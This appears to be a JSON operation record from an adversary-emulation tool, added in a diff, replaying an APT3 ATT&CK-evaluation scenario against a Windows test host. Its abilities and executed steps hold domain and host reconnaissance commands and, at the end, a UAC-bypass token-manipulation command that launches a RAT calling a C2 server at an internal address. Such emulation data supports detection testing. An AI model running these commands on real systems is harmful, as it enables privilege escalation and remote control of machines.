@@ -1,0 +1,702 @@
+{
+    "adversary": {
+        "adversary_id": "80e9c544-c5ea-423d-b4f3-c0de3c2947ba",
+        "description": "Initial Discovery and Privilege Escalation",
+        "id": 10,
+        "name": "ATT&CK Eval APT3 - 2-3.A",
+        "phases": {
+            "1": [
+                {
+                    "ability_id": "64f1fcb4-399d-4f3b-9a6b-13ec00e1c2ce",
+                    "adversary_map_id": 61,
+                    "cleanup": "",
+                    "description": "The arp utility is executed via cmd to enumerate local ARP configuration information.",
+                    "executor": "cmd",
+                    "id": 164,
+                    "name": "2.A.2 - System Network Configuration Discovery (T1016)",
+                    "parsers": [],
+                    "payload": [],
+                    "platform": "windows",
+                    "requirements": [],
+                    "tactic": "discovery",
+                    "technique_id": "T1016",
+                    "technique_name": "System Network Configuration Discovery",
+                    "test": "YXJwIC1h"
+                },
+                {
+                    "ability_id": "ee08a427-1e1d-4d8a-aeb1-978a7fcf9087",
+                    "adversary_map_id": 62,
+                    "cleanup": "",
+                    "description": "The ipconfig utility is executed via cmd to enumerate local TCP/IP network configuration information.",
+                    "executor": "cmd",
+                    "id": 145,
+                    "name": "2.A.1 - System Network Configuration Discovery (T1016)",
+                    "parsers": [],
+                    "payload": [],
+                    "platform": "windows",
+                    "requirements": [],
+                    "tactic": "discovery",
+                    "technique_id": "T1016",
+                    "technique_name": "System Network Configuration Discovery",
+                    "test": "aXBjb25maWcgL2FsbA=="
+                }
+            ],
+            "2": [
+                {
+                    "ability_id": "35d95b64-c1f8-4ac7-a2f2-8959218239cd",
+                    "adversary_map_id": 63,
+                    "cleanup": "",
+                    "description": "The native echo command is executed via cmd to enumerate local environment variables associated with current user and domain.",
+                    "executor": "cmd",
+                    "id": 149,
+                    "name": "2.B.1 - System Owner / User Discovery (T1033)",
+                    "parsers": [],
+                    "payload": [],
+                    "platform": "windows",
+                    "requirements": [],
+                    "tactic": "discovery",
+                    "technique_id": "T1033",
+                    "technique_name": "System Owner/User Discovery",
+                    "test": "ZWNobyAlVVNFUkRPTUFJTiVcJVVTRVJOQU1FJQ=="
+                }
+            ],
+            "3": [
+                {
+                    "ability_id": "41610306-087c-4c34-874b-37b8ed633a36",
+                    "adversary_map_id": 64,
+                    "cleanup": "",
+                    "description": "The tasklist utility is executed via cmd to enumerate local running processes.",
+                    "executor": "cmd",
+                    "id": 144,
+                    "name": "2.C.2 - Process Discovery (T1057)",
+                    "parsers": [],
+                    "payload": [],
+                    "platform": "windows",
+                    "requirements": [],
+                    "tactic": "discovery",
+                    "technique_id": "T1057",
+                    "technique_name": "Process Discovery",
+                    "test": "dGFza2xpc3QgL3Y="
+                },
+                {
+                    "ability_id": "5df12481-9d8c-4235-b550-9cefc8ed7361",
+                    "adversary_map_id": 65,
+                    "cleanup": "",
+                    "description": "API call(s) are executed to enumerate local running processes.",
+                    "executor": "psh",
+                    "id": 147,
+                    "name": "2.C.1 - Process Discovery (T1057)",
+                    "parsers": [],
+                    "payload": [
+                        {
+                            "ability": 147,
+                            "payload": "ps.ps1"
+                        }
+                    ],
+                    "platform": "windows",
+                    "requirements": [],
+                    "tactic": "discovery",
+                    "technique_id": "T1057",
+                    "technique_name": "Process Discovery",
+                    "test": "SW1wb3J0LU1vZHVsZSAuXHBzLnBzMSAtVmVyYm9zZSAtRm9yY2U7ClByb2Nlc3NMaXN0"
+                },
+                {
+                    "ability_id": "5df12481-9d8c-4235-b550-9cefc8ed7361",
+                    "adversary_map_id": 65,
+                    "cleanup": "",
+                    "description": "API call(s) are executed to enumerate local running processes.",
+                    "executor": "pwsh",
+                    "id": 148,
+                    "name": "2.C.1 - Process Discovery (T1057)",
+                    "parsers": [],
+                    "payload": [
+                        {
+                            "ability": 148,
+                            "payload": "ps.ps1"
+                        }
+                    ],
+                    "platform": "windows",
+                    "requirements": [],
+                    "tactic": "discovery",
+                    "technique_id": "T1057",
+                    "technique_name": "Process Discovery",
+                    "test": "SW1wb3J0LU1vZHVsZSAuXHBzLnBzMSAtVmVyYm9zZSAtRm9yY2U7ClByb2Nlc3NMaXN0"
+                }
+            ],
+            "4": [
+                {
+                    "ability_id": "144b1384-5060-494f-80eb-91772695cdf3",
+                    "adversary_map_id": 66,
+                    "cleanup": "",
+                    "description": "The net utility is executed via cmd to enumerate local active services.",
+                    "executor": "cmd",
+                    "id": 163,
+                    "name": "2.D.2 - System Service Discovery (T1007)",
+                    "parsers": [],
+                    "payload": [],
+                    "platform": "windows",
+                    "requirements": [],
+                    "tactic": "discovery",
+                    "technique_id": "T1007",
+                    "technique_name": "System Service Discovery",
+                    "test": "bmV0IHN0YXJ0"
+                },
+                {
+                    "ability_id": "2ff877b4-0c00-401e-9d3f-070c70b610df",
+                    "adversary_map_id": 67,
+                    "cleanup": "",
+                    "description": "The sc utility is executed via cmd to enumerate local active services.",
+                    "executor": "cmd",
+                    "id": 150,
+                    "name": "2.D.1 - System Service Discovery (T1007)",
+                    "parsers": [],
+                    "payload": [],
+                    "platform": "windows",
+                    "requirements": [],
+                    "tactic": "discovery",
+                    "technique_id": "T1007",
+                    "technique_name": "System Service Discovery",
+                    "test": "c2MgcXVlcnk="
+                }
+            ],
+            "5": [
+                {
+                    "ability_id": "7c2a6e5b-1adb-464f-a581-4677391f8dd6",
+                    "adversary_map_id": 68,
+                    "cleanup": "",
+                    "description": "The net utility is executed via cmd to enumerate local operating system configuration.",
+                    "executor": "cmd",
+                    "id": 152,
+                    "name": "2.E.2 - System Information Discovery (T1082)",
+                    "parsers": [],
+                    "payload": [],
+                    "platform": "windows",
+                    "requirements": [],
+                    "tactic": "discovery",
+                    "technique_id": "T1082",
+                    "technique_name": "System Information Discovery",
+                    "test": "bmV0IGNvbmZpZyB3b3Jrc3RhdGlvbg=="
+                },
+                {
+                    "ability_id": "d2ea2676-7f85-4228-b980-ab3c0e1adc03",
+                    "adversary_map_id": 69,
+                    "cleanup": "",
+                    "description": "The systeminfo utility is executed via cmd to enumerate local operating system configuration.",
+                    "executor": "cmd",
+                    "id": 154,
+                    "name": "2.E.1 - System Information Discovery (T1082)",
+                    "parsers": [],
+                    "payload": [],
+                    "platform": "windows",
+                    "requirements": [],
+                    "tactic": "discovery",
+                    "technique_id": "T1082",
+                    "technique_name": "System Information Discovery",
+                    "test": "c3lzdGVtaW5mbw=="
+                }
+            ],
+            "6": [
+                {
+                    "ability_id": "26181249-be75-41ed-9fe7-5c30ea8c2d4d",
+                    "adversary_map_id": 70,
+                    "cleanup": "",
+                    "description": "The net utility is executed via cmd to enumerate members of the domain controller\u2019s administrators group.",
+                    "executor": "cmd",
+                    "id": 162,
+                    "name": "2.F.2 - Permissions Groups Discovery (T1069)",
+                    "parsers": [],
+                    "payload": [],
+                    "platform": "windows",
+                    "requirements": [],
+                    "tactic": "discovery",
+                    "technique_id": "T1069",
+                    "technique_name": "Permission Groups Discovery",
+                    "test": "bmV0IGxvY2FsZ3JvdXAgYWRtaW5pc3RyYXRvcnMgL2RvbWFpbg=="
+                },
+                {
+                    "ability_id": "84377d7a-0363-44fd-a082-44657ca1858f",
+                    "adversary_map_id": 71,
+                    "cleanup": "",
+                    "description": "The net utility is executed via cmd to enumerate members of the domain administrators group.",
+                    "executor": "psh",
+                    "id": 167,
+                    "name": "2.F.3 - Permissions Groups Discovery (T1069)",
+                    "parsers": [],
+                    "payload": [],
+                    "platform": "windows",
+                    "requirements": [],
+                    "tactic": "discovery",
+                    "technique_id": "T1069",
+                    "technique_name": "Permission Groups Discovery",
+                    "test": "Y21kLmV4ZSAvYyBuZXQgZ3JvdXAgIkRvbWFpbiBBZG1pbnMiIC9kb21haW4="
+                },
+                {
+                    "ability_id": "84377d7a-0363-44fd-a082-44657ca1858f",
+                    "adversary_map_id": 71,
+                    "cleanup": "",
+                    "description": "The net utility is executed via cmd to enumerate members of the domain administrators group.",
+                    "executor": "pwsh",
+                    "id": 168,
+                    "name": "2.F.3 - Permissions Groups Discovery (T1069)",
+                    "parsers": [],
+                    "payload": [],
+                    "platform": "windows",
+                    "requirements": [],
+                    "tactic": "discovery",
+                    "technique_id": "T1069",
+                    "technique_name": "Permission Groups Discovery",
+                    "test": "Y21kLmV4ZSAvYyBuZXQgZ3JvdXAgIkRvbWFpbiBBZG1pbnMiIC9kb21haW4="
+                },
+                {
+                    "ability_id": "faa96e7f-081a-40b7-a743-a6a7f2627ea3",
+                    "adversary_map_id": 72,
+                    "cleanup": "",
+                    "description": "The net utility is executed via cmd to enumerate members of the local system's administrators group.",
+                    "executor": "cmd",
+                    "id": 155,
+                    "name": "2.F.1 - Permissions Groups Discovery (T1069)",
+                    "parsers": [],
+                    "payload": [],
+                    "platform": "windows",
+                    "requirements": [],
+                    "tactic": "discovery",
+                    "technique_id": "T1069",
+                    "technique_name": "Permission Groups Discovery",
+                    "test": "bmV0IGxvY2FsZ3JvdXAgYWRtaW5pc3RyYXRvcnM="
+                }
+            ],
+            "7": [
+                {
+                    "ability_id": "61221fb9-cb32-46d5-98fd-90567a621526",
+                    "adversary_map_id": 73,
+                    "cleanup": "",
+                    "description": "The net utility is executed via cmd to enumerate domain user accounts.",
+                    "executor": "cmd",
+                    "id": 159,
+                    "name": "2.G.1 - Account Discovery (T1087)",
+                    "parsers": [],
+                    "payload": [],
+                    "platform": "windows",
+                    "requirements": [],
+                    "tactic": "discovery",
+                    "technique_id": "T1087",
+                    "technique_name": "Account Discovery",
+                    "test": "bmV0IHVzZXIgL2RvbWFpbg=="
+                },
+                {
+                    "ability_id": "9ce5bf9f-44ec-44c4-bbe0-6d68a83e1b76",
+                    "adversary_map_id": 74,
+                    "cleanup": "",
+                    "description": "The net utility is executed via cmd to enumerate detailed information about a specific user account.",
+                    "executor": "cmd",
+                    "id": 146,
+                    "name": "2.G.2 - Account Discovery (T1087)",
+                    "parsers": [],
+                    "payload": [],
+                    "platform": "windows",
+                    "requirements": [],
+                    "tactic": "discovery",
+                    "technique_id": "T1087",
+                    "technique_name": "Account Discovery",
+                    "test": "bmV0IHVzZXIgJVVTRVJOQU1FJSAvZG9tYWlu"
+                }
+            ],
+            "8": [
+                {
+                    "ability_id": "5c23f638-9cfc-4fc4-9cab-4af628fef70a",
+                    "adversary_map_id": 75,
+                    "cleanup": "",
+                    "description": "The reg utility is executed via cmd to enumerate a specific Registry key associated with local system policies to ensure that the user will not be prompted for credentials when elevating permissions.",
+                    "executor": "cmd",
+                    "id": 151,
+                    "name": "2.H.1 - Query Registry (T1012)",
+                    "parsers": [],
+                    "payload": [],
+                    "platform": "windows",
+                    "requirements": [],
+                    "tactic": "discovery",
+                    "technique_id": "T1012",
+                    "technique_name": "Query Registry",
+                    "test": "cmVnIHF1ZXJ5IEhLTE1cU09GVFdBUkVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cUG9saWNpZXNcU3lzdGVt"
+                }
+            ],
+            "9": [
+                {
+                    "ability_id": "1345bff7-6f26-43b2-a92a-9aabccdb3db0",
+                    "adversary_map_id": 76,
+                    "cleanup": "",
+                    "description": "A UAC bypass technique is executed to steal the token of an existing high-integrity process and launch a new, high-integrity RAT with limited functionality.",
+                    "executor": "psh",
+                    "id": 169,
+                    "name": "3.A.1 - Bypass User Account Control (T1088)",
+                    "parsers": [],
+                    "payload": [
+                        {
+                            "ability": 169,
+                            "payload": "update.ps1,Invoke-BypassUACTokenManipulation.ps1"
+                        }
+                    ],
+                    "platform": "windows",
+                    "requirements": [],
+                    "tactic": "privilege-escalation",
+                    "technique_id": "T1088",
+                    "technique_name": "Bypass User Account Control (T1088) via Access Token Manipulation (T1134)",
+                    "test": "SW1wb3J0LU1vZHVsZSAuXEludm9rZS1CeXBhc3NVQUNUb2tlbk1hbmlwdWxhdGlvbi5wczEgLVZlcmJvc2UgLUZvcmNlOwpNb3ZlLUl0ZW0gLVBhdGggLlx1cGRhdGUucHMxIC1EZXN0aW5hdGlvbiAkZW52OkFQUERBVEEgLUZvcmNlOwokcGNvZGUgPSBbU3lzdGVtLkNvbnZlcnRdOjpUb0Jhc2U2NFN0cmluZyhbU3lzdGVtLlRleHQuRW5jb2RpbmddOjpVbmljb2RlLkdldEJ5dGVzKCJJbXBvcnQtTW9kdWxlICRlbnY6QVBQREFUQVx1cGRhdGUucHMxO3VwZGF0ZSgnI3tzZXJ2ZXJ9JykiKSk7Ckludm9rZS1CeXBhc3NVQUNUb2tlbk1hbmlwdWxhdGlvbiAtQXJndW1lbnRzICItbm9wIC1leGVjIGJ5cGFzcyAtRW5jb2RlZENvbW1hbmQgJHBjb2RlIiAtVmVyYm9zZQ=="
+                },
+                {
+                    "ability_id": "1345bff7-6f26-43b2-a92a-9aabccdb3db0",
+                    "adversary_map_id": 76,
+                    "cleanup": "",
+                    "description": "A UAC bypass technique is executed to steal the token of an existing high-integrity process and launch a new, high-integrity RAT with limited functionality.",
+                    "executor": "pwsh",
+                    "id": 170,
+                    "name": "3.A.1 - Bypass User Account Control (T1088)",
+                    "parsers": [],
+                    "payload": [
+                        {
+                            "ability": 170,
+                            "payload": "update.ps1,Invoke-BypassUACTokenManipulation.ps1"
+                        }
+                    ],
+                    "platform": "windows",
+                    "requirements": [],
+                    "tactic": "privilege-escalation",
+                    "technique_id": "T1088",
+                    "technique_name": "Bypass User Account Control (T1088) via Access Token Manipulation (T1134)",
+                    "test": "SW1wb3J0LU1vZHVsZSAuXEludm9rZS1CeXBhc3NVQUNUb2tlbk1hbmlwdWxhdGlvbi5wczEgLVZlcmJvc2UgLUZvcmNlOwpNb3ZlLUl0ZW0gLVBhdGggLlx1cGRhdGUucHMxIC1EZXN0aW5hdGlvbiAkZW52OkFQUERBVEEgLUZvcmNlOwokcGNvZGUgPSBbU3lzdGVtLkNvbnZlcnRdOjpUb0Jhc2U2NFN0cmluZyhbU3lzdGVtLlRleHQuRW5jb2RpbmddOjpVbmljb2RlLkdldEJ5dGVzKCJJbXBvcnQtTW9kdWxlICRlbnY6QVBQREFUQVx1cGRhdGUucHMxO3VwZGF0ZSgnI3tzZXJ2ZXJ9JykiKSk7Ckludm9rZS1CeXBhc3NVQUNUb2tlbk1hbmlwdWxhdGlvbiAtQXJndW1lbnRzICItbm9wIC1leGVjIGJ5cGFzcyAtRW5jb2RlZENvbW1hbmQgJHBjb2RlIiAtVmVyYm9zZQ=="
+                }
+            ]
+        }
+    },
+    "facts": [
+        {
+            "id": 5,
+            "link_id": 0,
+            "property": "remote.file.share",
+            "relationships": [],
+            "score": 1,
+            "source_id": "2",
+            "value": "\\\\VBOXSVR\\Resume_Viewer"
+        },
+        {
+            "id": 6,
+            "link_id": 0,
+            "property": "remote.file.name",
+            "relationships": [],
+            "score": 1,
+            "source_id": "2",
+            "value": "Resume.pdf"
+        }
+    ],
+    "finish": "2019-10-24 15:33:42",
+    "host_group": [
+        {
+            "architecture": "amd64",
+            "executors": [
+                {
+                    "executor": "cmd",
+                    "preferred": 1
+                },
+                {
+                    "executor": "psh",
+                    "preferred": 0
+                },
+                {
+                    "executor": "shellcode_amd64",
+                    "preferred": 0
+                }
+            ],
+            "host_group": "my_group",
+            "id": 1,
+            "last_seen": "2019-10-24 15:33:40",
+            "last_trusted_seen": "2019-10-24 15:33:40",
+            "location": "C:\\Users\\Public\\sandcat.exe",
+            "paw": "AJ-Win7x64$AJ-Win7x64\\testuser",
+            "pid": 1436,
+            "platform": "windows",
+            "ppid": 2432,
+            "server": "http://10.203.202.154:8888",
+            "sleep_max": 60,
+            "sleep_min": 60,
+            "trusted": 1
+        }
+    ],
+    "id": 1,
+    "jitter": "10/20",
+    "name": "AA",
+    "planner": {
+        "id": 1,
+        "module": "plugins.stockpile.app.sequential",
+        "name": "sequential",
+        "params": {}
+    },
+    "skipped_abilities": [
+        {
+            "AJ-Win7x64$AJ-Win7x64\\testuser": []
+        }
+    ],
+    "start": "2019-10-24 14:53:35",
+    "steps": {
+        "AJ-Win7x64$AJ-Win7x64\\testuser": {
+            "agent_id": 1,
+            "steps": [
+                {
+                    "ability_id": "64f1fcb4-399d-4f3b-9a6b-13ec00e1c2ce",
+                    "attack": {
+                        "tactic": "discovery",
+                        "technique_id": "T1016",
+                        "technique_name": "System Network Configuration Discovery"
+                    },
+                    "command": "arp -a",
+                    "delegated": "2019-10-24 14:53:40.955151",
+                    "description": "The arp utility is executed via cmd to enumerate local ARP configuration information.",
+                    "executor": "cmd",
+                    "name": "2.A.2 - System Network Configuration Discovery (T1016)",
+                    "platform": "windows",
+                    "run": "2019-10-24 14:53:41",
+                    "status": 0
+                },
+                {
+                    "ability_id": "ee08a427-1e1d-4d8a-aeb1-978a7fcf9087",
+                    "attack": {
+                        "tactic": "discovery",
+                        "technique_id": "T1016",
+                        "technique_name": "System Network Configuration Discovery"
+                    },
+                    "command": "ipconfig /all",
+                    "delegated": "2019-10-24 14:53:40.955284",
+                    "description": "The ipconfig utility is executed via cmd to enumerate local TCP/IP network configuration information.",
+                    "executor": "cmd",
+                    "name": "2.A.1 - System Network Configuration Discovery (T1016)",
+                    "platform": "windows",
+                    "run": "2019-10-24 14:53:58",
+                    "status": 0
+                },
+                {
+                    "ability_id": "35d95b64-c1f8-4ac7-a2f2-8959218239cd",
+                    "attack": {
+                        "tactic": "discovery",
+                        "technique_id": "T1033",
+                        "technique_name": "System Owner/User Discovery"
+                    },
+                    "command": "echo %USERDOMAIN%\\%USERNAME%",
+                    "delegated": "2019-10-24 14:54:10.967648",
+                    "description": "The native echo command is executed via cmd to enumerate local environment variables associated with current user and domain.",
+                    "executor": "cmd",
+                    "name": "2.B.1 - System Owner / User Discovery (T1033)",
+                    "platform": "windows",
+                    "run": "2019-10-24 14:54:10",
+                    "status": 0
+                },
+                {
+                    "ability_id": "41610306-087c-4c34-874b-37b8ed633a36",
+                    "attack": {
+                        "tactic": "discovery",
+                        "technique_id": "T1057",
+                        "technique_name": "Process Discovery"
+                    },
+                    "command": "tasklist /v",
+                    "delegated": "2019-10-24 14:54:26.975498",
+                    "description": "The tasklist utility is executed via cmd to enumerate local running processes.",
+                    "executor": "cmd",
+                    "name": "2.C.2 - Process Discovery (T1057)",
+                    "platform": "windows",
+                    "run": "2019-10-24 14:54:27",
+                    "status": 0
+                },
+                {
+                    "ability_id": "5df12481-9d8c-4235-b550-9cefc8ed7361",
+                    "attack": {
+                        "tactic": "discovery",
+                        "technique_id": "T1057",
+                        "technique_name": "Process Discovery"
+                    },
+                    "command": "Import-Module .\\ps.ps1 -Verbose -Force;ProcessList",
+                    "delegated": "2019-10-24 14:54:26.975676",
+                    "description": "API call(s) are executed to enumerate local running processes.",
+                    "executor": "psh",
+                    "name": "2.C.1 - Process Discovery (T1057)",
+                    "platform": "windows",
+                    "run": "2019-10-24 14:55:39",
+                    "status": 124
+                },
+                {
+                    "ability_id": "144b1384-5060-494f-80eb-91772695cdf3",
+                    "attack": {
+                        "tactic": "discovery",
+                        "technique_id": "T1007",
+                        "technique_name": "System Service Discovery"
+                    },
+                    "command": "net start",
+                    "delegated": "2019-10-24 14:55:59.997113",
+                    "description": "The net utility is executed via cmd to enumerate local active services.",
+                    "executor": "cmd",
+                    "name": "2.D.2 - System Service Discovery (T1007)",
+                    "platform": "windows",
+                    "run": "2019-10-24 14:56:00",
+                    "status": 0
+                },
+                {
+                    "ability_id": "2ff877b4-0c00-401e-9d3f-070c70b610df",
+                    "attack": {
+                        "tactic": "discovery",
+                        "technique_id": "T1007",
+                        "technique_name": "System Service Discovery"
+                    },
+                    "command": "sc query",
+                    "delegated": "2019-10-24 14:55:59.997267",
+                    "description": "The sc utility is executed via cmd to enumerate local active services.",
+                    "executor": "cmd",
+                    "name": "2.D.1 - System Service Discovery (T1007)",
+                    "platform": "windows",
+                    "run": "2019-10-24 14:56:12",
+                    "status": 0
+                },
+                {
+                    "ability_id": "7c2a6e5b-1adb-464f-a581-4677391f8dd6",
+                    "attack": {
+                        "tactic": "discovery",
+                        "technique_id": "T1082",
+                        "technique_name": "System Information Discovery"
+                    },
+                    "command": "net config workstation",
+                    "delegated": "2019-10-24 14:56:28.011365",
+                    "description": "The net utility is executed via cmd to enumerate local operating system configuration.",
+                    "executor": "cmd",
+                    "name": "2.E.2 - System Information Discovery (T1082)",
+                    "platform": "windows",
+                    "run": "2019-10-24 14:56:28",
+                    "status": 1
+                },
+                {
+                    "ability_id": "d2ea2676-7f85-4228-b980-ab3c0e1adc03",
+                    "attack": {
+                        "tactic": "discovery",
+                        "technique_id": "T1082",
+                        "technique_name": "System Information Discovery"
+                    },
+                    "command": "systeminfo",
+                    "delegated": "2019-10-24 14:56:28.011498",
+                    "description": "The systeminfo utility is executed via cmd to enumerate local operating system configuration.",
+                    "executor": "cmd",
+                    "name": "2.E.1 - System Information Discovery (T1082)",
+                    "platform": "windows",
+                    "run": "2019-10-24 14:56:51",
+                    "status": 0
+                },
+                {
+                    "ability_id": "26181249-be75-41ed-9fe7-5c30ea8c2d4d",
+                    "attack": {
+                        "tactic": "discovery",
+                        "technique_id": "T1069",
+                        "technique_name": "Permission Groups Discovery"
+                    },
+                    "command": "net localgroup administrators /domain",
+                    "delegated": "2019-10-24 14:57:01.021707",
+                    "description": "The net utility is executed via cmd to enumerate members of the domain controller\u2019s administrators group.",
+                    "executor": "cmd",
+                    "name": "2.F.2 - Permissions Groups Discovery (T1069)",
+                    "platform": "windows",
+                    "run": "2019-10-24 14:57:01",
+                    "status": 1
+                },
+                {
+                    "ability_id": "84377d7a-0363-44fd-a082-44657ca1858f",
+                    "attack": {
+                        "tactic": "discovery",
+                        "technique_id": "T1069",
+                        "technique_name": "Permission Groups Discovery"
+                    },
+                    "command": "cmd.exe /c net group \"Domain Admins\" /domain",
+                    "delegated": "2019-10-24 14:58:16.023929",
+                    "description": "The net utility is executed via cmd to enumerate members of the domain administrators group.",
+                    "executor": "psh",
+                    "name": "2.F.3 - Permissions Groups Discovery (T1069)",
+                    "platform": "windows",
+                    "run": "2019-10-24 14:58:16",
+                    "status": 1
+                },
+                {
+                    "ability_id": "faa96e7f-081a-40b7-a743-a6a7f2627ea3",
+                    "attack": {
+                        "tactic": "discovery",
+                        "technique_id": "T1069",
+                        "technique_name": "Permission Groups Discovery"
+                    },
+                    "command": "net localgroup administrators",
+                    "delegated": "2019-10-24 14:58:16.024103",
+                    "description": "The net utility is executed via cmd to enumerate members of the local system's administrators group.",
+                    "executor": "cmd",
+                    "name": "2.F.1 - Permissions Groups Discovery (T1069)",
+                    "platform": "windows",
+                    "run": "2019-10-24 14:58:29",
+                    "status": 0
+                },
+                {
+                    "ability_id": "61221fb9-cb32-46d5-98fd-90567a621526",
+                    "attack": {
+                        "tactic": "discovery",
+                        "technique_id": "T1087",
+                        "technique_name": "Account Discovery"
+                    },
+                    "command": "net user /domain",
+                    "delegated": "2019-10-24 14:59:49.031339",
+                    "description": "The net utility is executed via cmd to enumerate domain user accounts.",
+                    "executor": "cmd",
+                    "name": "2.G.1 - Account Discovery (T1087)",
+                    "platform": "windows",
+                    "run": "2019-10-24 14:59:49",
+                    "status": 1
+                },
+                {
+                    "ability_id": "9ce5bf9f-44ec-44c4-bbe0-6d68a83e1b76",
+                    "attack": {
+                        "tactic": "discovery",
+                        "technique_id": "T1087",
+                        "technique_name": "Account Discovery"
+                    },
+                    "command": "net user %USERNAME% /domain",
+                    "delegated": "2019-10-24 14:59:49.031481",
+                    "description": "The net utility is executed via cmd to enumerate detailed information about a specific user account.",
+                    "executor": "cmd",
+                    "name": "2.G.2 - Account Discovery (T1087)",
+                    "platform": "windows",
+                    "run": "2019-10-24 15:00:09",
+                    "status": 1
+                },
+                {
+                    "ability_id": "5c23f638-9cfc-4fc4-9cab-4af628fef70a",
+                    "attack": {
+                        "tactic": "discovery",
+                        "technique_id": "T1012",
+                        "technique_name": "Query Registry"
+                    },
+                    "command": "reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System",
+                    "delegated": "2019-10-24 15:33:21.542262",
+                    "description": "The reg utility is executed via cmd to enumerate a specific Registry key associated with local system policies to ensure that the user will not be prompted for credentials when elevating permissions.",
+                    "executor": "cmd",
+                    "name": "2.H.1 - Query Registry (T1012)",
+                    "platform": "windows",
+                    "run": "2019-10-24 15:33:21",
+                    "status": 0
+                },
+                {
+                    "ability_id": "1345bff7-6f26-43b2-a92a-9aabccdb3db0",
+                    "attack": {
+                        "tactic": "privilege-escalation",
+                        "technique_id": "T1088",
+                        "technique_name": "Bypass User Account Control (T1088) via Access Token Manipulation (T1134)"
+                    },
+                    "command": "Import-Module .\\Invoke-BypassUACTokenManipulation.ps1 -Verbose -Force;Move-Item -Path .\\update.ps1 -Destination $env:APPDATA -Force;$pcode = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes(\"Import-Module $env:APPDATA\\update.ps1;update('http://10.203.202.154:8888')\"));Invoke-BypassUACTokenManipulation -Arguments \"-nop -exec bypass -EncodedCommand $pcode\" -Verbose",
+                    "delegated": "2019-10-24 15:33:39.548934",
+                    "description": "A UAC bypass technique is executed to steal the token of an existing high-integrity process and launch a new, high-integrity RAT with limited functionality.",
+                    "executor": "psh",
+                    "name": "3.A.1 - Bypass User Account Control (T1088)",
+                    "platform": "windows",
+                    "run": "2019-10-24 15:33:40",
+                    "status": 0
+                }
+            ]
+        }
+    }
+}
